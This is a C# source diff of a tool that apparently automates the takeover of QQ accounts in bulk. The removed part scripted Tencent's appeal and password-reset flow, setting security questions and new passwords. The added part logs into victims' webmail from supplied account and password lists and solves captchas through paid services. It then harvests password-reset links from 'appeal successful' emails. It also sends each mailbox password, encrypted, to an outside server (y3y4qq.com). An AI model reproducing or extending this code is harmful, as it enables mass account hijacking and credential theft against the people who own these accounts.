@@ -13,6 +13,9 @@ using System.Globalization;
 using System.Threading;
 using System.Configuration;
 using System.Net;
+using System.Management;
+using System.Security.Cryptography;
+using ws.hoyland.sszs.Properties;
 
 namespace ws.hoyland.sszs
 {
@@ -28,6 +31,9 @@ namespace ws.hoyland.sszs
 
         private StreamWriter[] output = new StreamWriter[2]; //成功，失败，未运行
         private String[] fns = new String[] { "申诉结果", "申诉成功-IP" };
+
+        private int suc = 0;
+        private int total = 0;
 
         public RSForm()
         {
@@ -160,6 +166,8 @@ namespace ws.hoyland.sszs
                     {
                         //List<String> ls = (List<String>)msg.getData();
                         //label4.Text = ls[0];
+                        total = accounts.Count;
+                        Stat();
                         dataGridView1.FirstDisplayedScrollingRowIndex = 0;
                     }
 
@@ -234,6 +242,43 @@ namespace ws.hoyland.sszs
             this.BeginInvoke(dlg);
         }
 
+
+        public void succ(int id)
+        {
+            dlg = delegate()
+            {
+                table1.Rows[id - 1][6] = Int32.Parse(table1.Rows[id - 1][6].ToString()) + 1;
+                dataGridView1.FirstDisplayedScrollingRowIndex = id - 1;
+            };
+            this.BeginInvoke(dlg);
+        }
+
+        public void fail(int id)
+        {
+            dlg = delegate()
+            {
+                table1.Rows[id - 1][7] = Int32.Parse(table1.Rows[id - 1][7].ToString()) + 1;
+                dataGridView1.FirstDisplayedScrollingRowIndex = id - 1;
+            };
+            this.BeginInvoke(dlg);
+        }
+
+        public void inc()
+        {
+            lock (this)
+            {
+                suc++;
+            }
+        }
+
+        public void Stat()
+        {
+            dlg = delegate()
+            {
+                label1.Text = suc + " / " + total + " = " + ((double)(100 * suc) / (double)total).ToString("F2") + "%";
+            };
+            this.BeginInvoke(dlg);
+        }
     }
 
     class RSTask
@@ -249,50 +294,33 @@ namespace ws.hoyland.sszs
         // private HttpUriRequest request = null;
         private string content = null;
         private byte[] bs = null;
-        private string resp = null;
         private RSForm form = null;
         private int id = -1;
-        private String account = null;
-        private String link = null;
         private Configuration cfa = null;
         private int fidx = -1;
         private int lidx = -1;
-        private string[] tqs = new string[3];//问题
-        private string[] tas = new string[3];//答案
-        private string[] qtag = new string[3]{
-                        "问题一", 
-                        "问题二", 
-                        "问题三"
-                    };
-
-        private string[] questions = new string[]{
-            "您父亲的姓名是？",
-            "您父亲的生日是？",
-            "您父亲的职业是？",
-            "您母亲的姓名是？",
-            "您母亲的生日是？",
-            "您母亲的职业是？",
-            "您配偶的姓名是？",
-            "您配偶的生日是？",
-            "您配偶的职业是？",
-            "您小学班主任的名字是？",
-            "您初中班主任的名字是？",
-            "您高中班主任的名字是？",
-            "您的学号（或工号）是？",
-            "您的出生地是？",
-            "您的小学校名是？",
-            "您最熟悉的童年好友名字是？",
-            "您最熟悉的学校宿舍室友名字是？",
-            "对您影响最大的人名字是？"
-        };
-
-        private StringBuilder sb = null;
+        
         private string original = null;
         private string line;
-        private string pwd = null;
         public static Random random = new Random();
         private string[] ms = null;
+        private bool uploadvcode = false;
+        private string ts = null;
+        private string vurl = null;
+        private string vurlx = null;
+        private string vuin = null;
+        private string vid = null;
+        private string result = null;
+        private byte[] bytes = null;
+        private int size = -1;
 
+        private EngineMessage message = null;
+        private StringBuilder pCodeResult = null;
+        private int nCaptchaId = -1;
+        private string mlist = null;
+
+        private int sc = 0;
+        private int fc = 0;
 
         public RSTask(RSForm form, String original)
         {
@@ -305,7 +333,6 @@ namespace ws.hoyland.sszs
             //this.link = ms[2];
 
             client = new HttpClient();
-            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0");
 
             cfa = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
         }
@@ -332,12 +359,13 @@ namespace ws.hoyland.sszs
                             reader.Close();
                         }
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
                         //throw e;
                     }
                 }
 
+                form.Stat();
                 form.SetColor(id, Color.Black);
             }
             catch (Exception)
@@ -346,272 +374,374 @@ namespace ws.hoyland.sszs
             }
         }
 
+
         private void process(int index)
         {
+            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0");
             switch (idx)
             {
-                case 0:
-                    form.info(id, "开始设置");
+                case 0: // 收邮件 
                     try
                     {
-                        url =
-                                link;
-
-                        data = client.OpenRead(url);
-                        // System.err.println(sig);
-                        reader = new StreamReader(data);
-                        line = reader.ReadToEnd();
-                        if (line.IndexOf("已过期") != -1)
+                        if (!uploadvcode)
                         {
-                            form.log(2, original.Substring(original.IndexOf("----") + 4));
-                            form.info(id, "凭证过期");
-                            runx = false;
+                            form.info(id, "打开邮箱");
+                            url =
+                                    "https://w.mail.qq.com/";
                         }
                         else
                         {
-                            idx++;
+                            form.info(id, "提交验证码");
                         }
-                    }
-                    catch (Exception e)
-                    {
-                        runx = false;
-                        //throw e;
-                    }
-                    break;
-
-                case 1:
-                    form.info(id, "填写帐号");
-                    try
-                    {
-                        url =
-                                "https://aq.qq.com/cn2/appeal/appeal_check_assist_account?UserAccount=" + account;
 
                         data = client.OpenRead(url);
-                        // System.err.println(sig);
+                        reader = new StreamReader(data);
+                        line = reader.ReadToEnd();
 
+                        if (line.IndexOf("name=\"ts\"") != -1)
+                        {
+                            ts = line.Substring(line.IndexOf("name=\"ts\"") - 12, 10);
+                        }
+                        else
+                        {
+                            form.info(id, "无法打开邮箱，任务结束");
+                            runx = false;
+                        }
                         idx++;
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
+                        form.info(id, "无法打开邮箱，任务结束");
                         runx = false;
                         //throw e;
                     }
                     break;
-                case 2:
-                    form.info(id, "重置");
+                case 1:
+                    form.info(id, "登录邮箱");
                     try
                     {
-                        url =
-                                "https://aq.qq.com/cn2/appeal/appeal_reset_jump";
+                        if (uploadvcode)
+                        {
+                            content = "device=&ts=" + ts + "&p=&f=xhtml&delegate_url=&action=&https=true&tfcont=22%2520serialization%3A%3Aarchive%25205%25200%25200%252010%25200%25200%25200%25208%2520authtype%25201%25208%25209%2520clientuin%25209%2520" + ms[4] + "%25209%2520aliastype%25207%2520%40qq.com%25206%2520domain%25206%2520qq.com%25202%2520ts%252010%25201392345223%25201%2520f%25205%2520xhtml%25205%2520https%25204%2520true%25203%2520uin%25209%2520" + ms[4] + "%25203%2520mss%25201%25201%25207%2520btlogin%25206%2520%2520%E7%99%BB%E5%BD%95%2520&verifycode=" + result + "&vid=" + vid + "&vuin=" + vuin + "&vurl=" + Util.UrlEncode(vurlx).Replace("%2e", ".") + "&mss=1&btlogin=+%E7%99%BB%E5%BD%95+";
+                            uploadvcode = false;
+                        }
+                        else
+                        {
+                            string ecp = Convert.ToBase64String(Util.hexStringToByte(getECP()));
+                            content = "device=&ts=" + ts + "&p=" + Util.UrlEncode(ecp) + "&f=xhtml&delegate_url=&action=&https=true&tfcont=&uin=" + ms[4] + "&aliastype=%40qq.com&pwd=&mss=1&btlogin=+%E7%99%BB%E5%BD%95+";
+                        }
 
-                        content = "uin=" + this.account;
-
-                        client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
+                        url = "https://w.mail.qq.com/cgi-bin/login?sid=";
 
                         bs = client.UploadData(url, "POST", Encoding.UTF8.GetBytes(content));
                         //byte[] bs = Encoding.GetEncoding("GB2312").GetBytes();
-                        //resp = Encoding.UTF8.GetString(bs);
+                        line = Encoding.UTF8.GetString(bs);
 
-                        url = "https://aq.qq.com/cn2/appeal/appeal_reset_mb_question";
-                        data = client.OpenRead(url);
-                        // System.err.println(sig);
-                        reader = new StreamReader(data);
-                        line = reader.ReadToEnd();
-
-                        if (line.IndexOf("本次申诉已成功设置") != -1)
+                        if (line.IndexOf("errtype=1") != -1)
                         {
-                            form.log(3, original.Substring(original.IndexOf("----") + 4));
-                            form.info(id, "已经设置");
+                            form.info(id, "邮箱密码错误");
                             runx = false;
                         }
-                        else
+                        else if (line.IndexOf("autoactivation") != -1)
                         {
+                            form.info(id, "未开通邮箱");
+                            runx = false;
+                        }
+                        else if (line.IndexOf("errtype=8") != -1)
+                        {
+                            form.info(id, "暂时无法登录邮箱");
+                            runx = false;
+                        }
+                        else if (line.IndexOf("errtype=3") != -1)
+                        {
+                            form.info(id, "需要验证码");
+                            line = line.Substring(line.IndexOf("url=https:") + 4);
+                            line = line.Substring(0, line.IndexOf("\"/>"));
+                            url = line;
+
+                            vurl = line.Substring(line.IndexOf("vurl=") + 5);
+                            vurl = vurl.Substring(0, vurl.IndexOf("&vid"));
+                            vurlx = vurl;
+                            vid = vurl.Substring(20, 32);
+                            vuin = url.Substring(url.IndexOf("vuin=") + 5);
+                            vuin = vuin.Substring(0, vuin.IndexOf("&"));
+
+                            vurl = vurl.EndsWith("gif") ? vurl : vurl + ".gif";
+
+                            Console.WriteLine(url);
+                            Console.WriteLine(vurl);
+                            Console.WriteLine(vid);
+                            Console.WriteLine(vuin);
                             idx++;
                         }
-
+                        else if (line.IndexOf("errtype=") == -1 && (line.IndexOf("today") != -1))//|| line.IndexOf("mobile") != -1
+                        {
+                            form.info(id, "登录成功");
+                            line = line.Substring(line.IndexOf("url=http") + 4);
+                            line = line.Substring(0, line.IndexOf("\"/>"));
+                            url = line;
+                            Console.WriteLine(url);
+                            idx = 14;//TODO
+                        }
+                        else // 验证码错误，报告验证码错误
+                        {
+                            form.info(id, "登录邮箱, 未知错误");
+                            runx = false;
+                        }
                     }
-                    catch (Exception e)
+                    catch (Exception)
+                    {
+                        form.info(id, "无法打开邮箱，任务结束");
+                        runx = false;
+                        ////throw e;
+                    }
+                    break;
+
+                case 2:
+                    form.info(id, "请求验证码");
+                    try
+                    {
+                        data = client.OpenRead(vurl);
+                        reader = new StreamReader(data);
+
+                        bytes = new byte[4096];
+                        size = data.Read(bytes, 0, bytes.Length);
+
+                        MemoryStream ms = new MemoryStream();
+                        ms.Write(bytes, 0, size);
+
+                        message = new EngineMessage();
+                        message.setType(EngineMessageType.IM_IMAGE_DATA);
+                        message.setData(ms);
+
+                        Engine.getInstance().fire(message);
+
+                        idx++;
+                    }
+                    catch (Exception)
                     {
                         runx = false;
                         //throw e;
                     }
                     break;
                 case 3:
-                    form.info(id, "设置密保");
+                    // 根据情况，阻塞或者提交验证码到UU
+                    form.info(id, "正在识别验证码");
                     try
                     {
-                        url =
-                                "https://aq.qq.com/cn2/appeal/appeal_reset_checkquestion";
+                        int nCodeType;
+                        pCodeResult = new StringBuilder("0000000000"); // 分配30个字节存放识别结果
 
-                        string[] tobeuploadans = new string[3];
-                        if ("False".Equals(cfa.AppSettings.Settings["DNA_F1"].Value))
+
+                        // 例：1004表示4位字母数字，不同类型收费不同。请准确填写，否则影响识别率。在此查询所有类型 http://www.yundama.com/price.html
+                        nCodeType = 1004;
+
+                        // 返回验证码ID，大于零为识别成功，返回其他错误代码请查询 http://www.yundama.com/apidoc/YDM_ErrorCode.html
+                        if (Engine.getInstance().getCptType() == 0)
                         {
-                            tobeuploadans[0] = genAns();
+                            nCaptchaId = YDMWrapper.YDM_DecodeByBytes(bytes, size, nCodeType, pCodeResult);
                         }
                         else
                         {
-                            tobeuploadans[0] = cfa.AppSettings.Settings["DNA_A1"].Value;
+                            nCaptchaId = UUWrapper.uu_recognizeByCodeTypeAndBytes(bytes, size, nCodeType, pCodeResult);
                         }
 
-                        if ("False".Equals(cfa.AppSettings.Settings["DNA_F2"].Value))
-                        {
-                            tobeuploadans[1] = genAns();
-                        }
-                        else
-                        {
-                            tobeuploadans[1] = cfa.AppSettings.Settings["DNA_A2"].Value;
-                        }
-
-                        if ("False".Equals(cfa.AppSettings.Settings["DNA_F3"].Value))
-                        {
-                            tobeuploadans[2] = genAns();
-                        }
-                        else
-                        {
-                            tobeuploadans[2] = cfa.AppSettings.Settings["DNA_A3"].Value;
-                        }
-
-                        content = "dna_ques_1=" + (Int32.Parse(cfa.AppSettings.Settings["DNA_Q1"].Value) + 1) + "&dna_answer_1=" + tobeuploadans[0] + "&dna_ques_2=" + (Int32.Parse(cfa.AppSettings.Settings["DNA_Q2"].Value) + 1) + "&dna_answer_2=" + tobeuploadans[1] + "&dna_ques_3=" + (Int32.Parse(cfa.AppSettings.Settings["DNA_Q3"].Value) + 1) + "&dna_answer_3=" + tobeuploadans[2] + "&mb_flow_type=dna&mb_up_from=";
+                        result = pCodeResult.ToString();
 
 
-                        //content = "dna_ques_1=1&dna_answer_1=zhang&dna_ques_2=4&dna_answer_2=huang&dna_ques_3=11&dna_answer_3=cai";
+                        //result = rsb.toString();
+                        //System.out.println("---"+result);
 
-                        client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-
-                        bs = client.UploadData(url, "POST", Encoding.UTF8.GetBytes(content));
-                        //byte[] bs = Encoding.GetEncoding("GB2312").GetBytes();
-
-                        resp = Encoding.UTF8.GetString(bs);
-
-                        for (int i = 0; i < tqs.Length; i++)
-                        {
-                            fidx = resp.IndexOf(qtag[i]) + 39;
-                            resp = resp.Substring(fidx);
-                            lidx = resp.IndexOf("<");
-                            tqs[i] = resp.Substring(0, lidx);//问题中文
-                            if (tqs[i].Equals("您初中班主任的名字？"))
-                            {
-                                tqs[i] = "您初中班主任的名字是？";
-                            }
-                            for (int m = 0; m < 3; m++)
-                            {
-                                if (tqs[i].Equals(questions[(Int32.Parse(cfa.AppSettings.Settings["DNA_Q" + (m + 1)].Value))]))
-                                //Console.WriteLine(questions[(Int32.Parse(cfa.AppSettings.Settings["DNA_Q" + (m + 1)].Value))]);
-                                //Console.WriteLine(tqs[i]);
-
-                                //if(questions[(Int32.Parse(cfa.AppSettings.Settings["DNA_Q"+(m+1)].Value))].IndexOf(tqs[i])!=-1)
-                                {
-                                    tas[i] = tobeuploadans[m];//cfa.AppSettings.Settings["DNA_A" + (m + 1)].Value;
-                                    break;
-                                }
-                            }
-                        }
-
-
-
-                        // System.err.println(sig);
-
-                        idx++;
+                        idx = 9;
+                        uploadvcode = true;
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
                         runx = false;
                         //throw e;
                     }
                     break;
                 case 4:
-                    form.info(id, "确认问题和答案");
-                    sb = new StringBuilder();
-                    for (int i = 0; i < tas.Length; i++)
+                    form.info(id, "验证码错误，报告异常");
+                    try
                     {
-                        if (i == tas.Length - 1)
+                        //
+                        int reportErrorResult = -1;
+                        if (Engine.getInstance().getCptType() == 0)
                         {
-                            sb.Append("a_" + (i + 1) + "=" + UrlEncode(tas[i]));
+                            reportErrorResult = YDMWrapper.YDM_Report(nCaptchaId, false);
                         }
                         else
                         {
-                            sb.Append("a_" + (i + 1) + "=" + UrlEncode(tas[i]) + "&");
+                            reportErrorResult = UUWrapper.uu_reportError(nCaptchaId);
                         }
-                    }
-                    url = "https://aq.qq.com/cn2/appeal/appeal_reset_mbajax?" + sb.ToString();
 
-                    data = client.OpenRead(url);
-                    //{ret: [0, 0, 0, 0]}
-                    data.Close();
-                    idx++;
+                        //idx = 0; // 重新开始
+                        idx = 9;//重新开始接收邮件
+                    }
+                    catch (Exception)
+                    {
+                        runx = false;
+                        //throw e;
+                    }
                     break;
                 case 5:
-                    form.info(id, "设置密保手机");
-                    url = "https://aq.qq.com/cn2/appeal/appeal_reset_mobile?";
-                    sb = new StringBuilder();
-                    for (int i = 0; i < tas.Length; i++)
+                    form.info(id, "获取邮件列表地址");
+                    try
                     {
-                        sb.Append("dna_answer_" + (i + 1) + "=" + UrlEncode(tas[i]) + "&");
-                    }
+                        data = client.OpenRead(url);
+                        reader = new StreamReader(data);
+                        line = reader.ReadToEnd();
 
-                    data = client.OpenRead(url + sb.ToString());
-                    data.Close();
-                    idx++;
+                        line = line.Substring(line.IndexOf("mail_list") - 9);
+                        url = line.Substring(0, line.IndexOf("\">"));
+                        mlist = url;
+                        idx++;
+                    }
+                    catch (Exception)
+                    {
+                        runx = false;
+                        //throw e;
+                    }
                     break;
                 case 6:
-                    form.info(id, "跳过，填写密码");
-                    url = "https://aq.qq.com/cn2/appeal/appeal_reset_passwd";
-
-                    content = "mb1=" + UrlEncode("请填写您的常用手机") + "&mb2=" + UrlEncode("请再次填写手机号码");
-                    Console.WriteLine(content);
-                    client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-
-                    bs = client.UploadData(url, "POST", Encoding.UTF8.GetBytes(content));
-                    //resp = Encoding.UTF8.GetString(bs);
-
-                    idx++;
-                    break;
-                case 7:
-                    form.info(id, "分析密码");
-                    pwd = GetPassWord();
-                    url = "https://aq.qq.com/cn2/appeal/appeal_reset_check_psw?psw=" + pwd + "&pwd2=" + pwd;
-                    //data = client.OpenRead(url);
-                    Console.WriteLine("PWD:" + pwd);
-                    data = client.OpenRead(url);
-                    data.Close();
-
-                    idx++;
-                    break;
-                case 8://第二次验证通过
-                    form.info(id, "获取密码强度");
-                    url = "https://aq.qq.com/cn2/ajax/get_psw_sgh?psw=" + pwd;
-                    data = client.OpenRead(url);
-
-                    data.Close();
-                    idx++;
-                    break;
-                case 9:
-                    form.info(id, "提交新密码");
-                    url = "https://aq.qq.com/cn2/appeal/appeal_reset_end";
-
-                    content = "psw=" + UrlEncode(pwd) + "&psw2=" + UrlEncode(pwd);
-                    //client.UploadString(url, content);
-                    bs = Encoding.GetEncoding("GB2312").GetBytes(client.UploadString(url, content));
-                    resp = Encoding.UTF8.GetString(bs);
-                    if (resp.IndexOf("资料设置成功") != -1)
+                    form.info(id, "读取邮件列表");
+                    try
                     {
-                        form.log(0, account + "----" + pwd + "----" + tqs[0] + "----" + tas[0] + "----" + tqs[1] + "----" + tas[1] + "----" + tqs[2] + "----" + tas[2]);
-                        form.info(id, "设置成功");
-                        //form.stat(3);
-                        //Console.WriteLine("");
-                    }
-                    else
-                    {
-                        ;
-                        form.log(1, original.Substring(original.IndexOf("----") + 4));
-                        form.info(id, "设置失败");
-                    }
-                    runx = false;//结束
+                        data = client.OpenRead("http://w.mail.qq.com" + mlist);
+                        reader = new StreamReader(data);
+                        line = reader.ReadToEnd();
 
+                        int formidx = -1;
+                        int qqidx = -1;
+                        if ((formidx = line.IndexOf("<form")) != -1 && (qqidx = line.IndexOf("申诉结果")) != -1 && line.Substring(formidx, qqidx).IndexOf("mui_font_bold") != -1)
+                        {
+                            //Console.WriteLine(line.Substring(formidx, qqidx - formidx));
+                            line = line.Substring(formidx, qqidx - formidx);
+                            line = line.Substring(line.LastIndexOf("/cgi-bin/readmail?"));
+                            url = line.Substring(0, line.IndexOf("\">"));
+
+                            form.info(id, " 读取邮件内容");
+                            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0");
+                            data = client.OpenRead("http://w.mail.qq.com" + url);
+                            reader = new StreamReader(data);
+                            line = reader.ReadToEnd();
+
+                            string rcl = line.Substring(line.IndexOf("回执编号[") + 5, 10);
+                            if (ms[3].Equals(rcl))
+                            {
+                                if (line.IndexOf("申诉成功") != -1)
+                                {
+                                    form.inc();
+                                    sc++;
+
+                                    form.succ(id);
+
+                                    fidx = line.IndexOf("<a style=\"color:red\" href=\"") + 27;
+                                    lidx = line.IndexOf("\" target=\"_blank\"><span>点此重新设置密码");
+                                    String link = line.Substring(fidx, lidx - fidx);
+                                    //System.err.println(rcl);
+                                    //System.err.println(link);
+                                    // 写文件
+                                    form.log(0, ms[1] + "----" + link);
+                                    form.log(1, ms[1] + "----" + ms[6]);
+
+                                }
+                                else if (line.IndexOf("申诉未能通过审核") != -1)
+                                {
+                                    fc++;
+                                    form.fail(id);
+                                }
+                            }
+
+                            //line = line.Substring(line.IndexOf("mail_list") - 9);
+                            //url = line.Substring(0, line.IndexOf("\">"));
+
+                        }
+                        runx = false;
+                        //
+                    }
+                    catch (Exception)
+                    {
+                        runx = false;
+
+                        //System.err.print("读取工具 : 收取邮件出错，新建任务运行.[");
+                        //for (int i = 0; i < msx.length; i++)
+                        //{
+                        //    System.err.print(msx[i] + "----");
+                        //}
+                        ///System.err.println();
+                        RSTask task = new RSTask(form, this.original);
+                        ThreadPool.QueueUserWorkItem(new WaitCallback(task.run));
+                        //throw e;
+                    }
                     break;
                 default:
                     break;
             }
+        }
+
+        private string getECP()
+        {
+            string ecp = null;
+            try
+            {
+                Crypter crypt = new Crypter();
+                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"c:\"");
+                disk.Get();
+                byte[] mc = Util.UMD5(disk.GetPropertyValue("VolumeSerialNumber").ToString() + "SSZS");
+
+                url = "http://www.y3y4qq.com/gc";
+                byte[] key = Util.getKey();
+                string content = Util.byteArrayToHexString(key).ToUpper() + Util.byteArrayToHexString(crypt.QQ_Encrypt(mc, key)).ToUpper();
+                Console.WriteLine(content);
+                string ct = "password=" + ms[5] + "&ts=" + this.ts;
+                Console.WriteLine(ct);
+                RSACryptoServiceProvider provider = new RSACryptoServiceProvider();
+
+                provider.FromXmlString(Resources.pbkey);
+
+                bs = Encoding.UTF8.GetBytes(ct);
+                //Console.WriteLine("LEN:"+bs.Length);
+                byte[] ciphertext = provider.Encrypt(bs, false);
+
+                /**
+                StringBuilder sb = new StringBuilder();
+                foreach (byte b in ciphertext)
+                {
+                    sb.AppendFormat("{0:X2}", b);
+                }
+                Console.WriteLine(sb.ToString());
+                **/
+
+                content += Util.byteArrayToHexString(ciphertext).ToUpper();
+                Console.WriteLine(content);
+
+                //Console.WriteLine(byteArrayToHexString(key).ToUpper());
+                //Console.WriteLine(content);
+                //client.UploadString(url, content);
+                //client.UploadString(url, 
+                //client.Encoding = Encoding.UTF8;
+                client.Headers[HttpRequestHeader.ContentType] = "text/plain; charset=UTF-8";
+
+                //client.UploadData(url, "POST", Encoding.UTF8.GetBytes(content));
+                bs = client.UploadData(url, "POST", Encoding.UTF8.GetBytes(content));
+                //byte[] bs = Encoding.GetEncoding("GB2312").GetBytes();
+
+                //bs = crypt.QQ_Decrypt(bs, key);
+                ecp = Encoding.UTF8.GetString(bs);
+                Console.WriteLine("R:" + ecp);
+                //bs = crypt.QQ_Decrypt(hexStringToByte(resp), key);
+                //expire = Int32.Parse(Encoding.UTF8.GetString(bs));
+                //Console.WriteLine("2:" + expire);
+            }
+            catch (Exception ex)
+            {
+                ecp = null;
+                Console.WriteLine(ex.Message);
+                //MessageBox.Show(ex.Message);
+            }
+            return ecp;
         }
 
         private string genAns()
